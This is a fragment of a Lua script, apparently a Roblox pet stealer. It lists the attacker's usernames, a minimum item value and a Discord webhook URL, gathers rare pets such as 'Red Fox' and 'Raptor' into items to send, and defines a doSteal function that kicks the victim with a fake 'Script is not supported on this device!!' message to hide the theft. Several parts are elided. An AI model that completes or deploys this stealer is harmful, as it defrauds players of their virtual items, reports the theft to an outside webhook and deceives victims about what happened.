_G.Usernames = {"k4ftt","Mradnane"}
_G.min_value = 1000
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1235438557959819294/vnz9CM9JdtDWDUeu4Mi2O_nGovtucqj5b4s-CcXCloNHL3-RjsvLCC_a5_JS022-Gko6"
...
local rarePets = {"Red Fox", "Raccoon", "Dragonfly","Raptor"}
local totalValue = 0
local itemsToSend = {}
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("Script is not supported on this device!!")
    end
